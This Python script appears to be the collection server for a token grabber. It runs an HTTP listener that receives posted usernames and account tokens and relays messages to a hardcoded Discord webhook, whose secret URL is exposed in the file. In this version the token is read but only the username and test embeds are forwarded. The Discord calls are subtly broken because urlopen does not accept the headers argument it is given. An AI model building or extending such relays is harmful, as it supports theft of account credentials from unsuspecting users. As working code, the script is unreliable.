from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import urllib.request

# REPLACE THIS WITH YOUR NEW WEBHOOK
WEBHOOK = "https://discord.com/api/webhooks/1457853928082247785/sbu1wSV0HVvimlh0CZhvhRpnAoX90fj6eMfN2SUHw6Gfh2FsVulYaeM4A2Ely-quGs94"

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            length = int(self.headers['Content-Length'])
            data = json.loads(self.rfile.read(length).decode())
            
            username = data.get('username', 'Unknown')
            token = data.get('token', '')
            
            print(f"Got: {username}")
            
            # SIMPLE test to Discord
            try:
                # Test 1: Simple message
                test1 = json.dumps({"content": f"User: {username}"}).encode()
                urllib.request.urlopen(WEBHOOK, data=test1, headers={'Content-Type': 'application/json'})
                print("Sent simple message to Discord")
                
                # Test 2: Embed (no token)
                embed = {"title": "Test", "description": "Testing", "color": 65280}
                test2 = json.dumps({"embeds": [embed]}).encode()
                urllib.request.urlopen(WEBHOOK, data=test2, headers={'Content-Type': 'application/json'})
                print("Sent embed to Discord")
                
            except Exception as e:
                print(f"Discord error: {e}")
            
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'OK')
            
        except Exception as e:
            print(f"Error: {e}")
            self.send_response(500)
            self.end_headers()
    
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')

print("Server starting on 5000")
HTTPServer(('0.0.0.0', 5000), Handler).serve_forever()
